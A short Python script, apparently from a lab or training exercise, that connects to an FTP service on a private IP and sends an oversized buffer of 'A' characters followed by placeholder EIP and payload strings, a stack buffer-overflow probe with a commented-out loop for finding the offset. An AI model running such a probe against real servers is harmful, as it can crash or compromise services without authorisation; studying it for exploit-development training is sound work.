import socket

ip = "192.168.196.231"

port = 21

EIP = "EDCB"
malware = "malware"

length =1996	#originally 1993



#for length in range(2000, 2050, 5):
try:
	sock = socket.socket()
	sock.settimeout(3)
	sock.connect((ip,port))
	print(sock.recv(1024))
	bad_str = "dont know" + "A"*length + EIP + malware
	sock.send(bad_str.encode('UTF-8'))
	print(sock.recv(1024))
	sock.close()
except Exception as e:
	print("something bad happened")
	print(length)
	print(e)
#	break
